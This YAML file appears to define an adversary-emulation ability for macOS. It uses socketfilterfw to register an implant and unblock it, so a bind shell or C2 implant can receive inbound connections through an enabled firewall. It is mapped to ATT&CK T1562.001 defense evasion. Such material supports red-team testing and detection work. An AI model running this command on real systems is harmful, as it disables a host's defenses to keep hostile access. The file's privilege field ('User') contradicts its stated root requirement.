- id: c5f2b87d-a544-ed12-984f-9ca3959e6e82
  name: socketfilterfw - Register and allow a planted listener to receive inbound connections
  description: --add registers an application with the firewall and --unblockapp marks it as allowed to
    receive inbound connections. Applied to a bind shell or C2 implant, this creates a persistent firewall
    allow-list entry so the implant accepts connections while the firewall stays enabled. Requires root,
    and the binary must exist at the referenced path.
  tactic: defense-evasion
  technique:
    attack_id: T1562.001
    name: 'Impair Defenses: Disable or Modify Tools'
  platforms:
    darwin:
      sh:
        command: /usr/libexec/ApplicationFirewall/socketfilterfw --add <IMPLANT_PATH> && /usr/libexec/ApplicationFirewall/socketfilterfw
          --unblockapp <IMPLANT_PATH>
  singleton: false
  privilege: User
  repeatable: true
  delete_payload: false
  buckets:
  - loobins
  - socketfilterfw
  - defense-evasion
  version: '1.0'
